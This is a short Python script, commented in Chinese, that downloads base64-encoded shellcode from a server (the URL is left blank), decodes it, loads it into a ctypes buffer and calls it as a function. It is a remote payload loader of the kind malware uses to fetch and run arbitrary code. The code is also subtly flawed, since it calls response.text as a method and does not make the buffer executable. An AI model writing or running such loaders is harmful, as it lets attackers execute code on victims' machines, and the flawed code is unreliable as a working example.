import requests
import ctypes
import base64

# 从服务器上下载shellcode
url = ""
response = requests.get(url)
shellcode = base64.b64decode(response.text())
# 申请内存空间
shellcode_buffer = ctypes.create_string_buffer(shellcode,len(shellcode))
# 创建shellcode的函数指针
shellcode_func = ctypes.cast(shellcode_buffer,ctypes.CFUNCTYPE(ctypes.c_void_p))
# 执行shellcode
shellcode_func()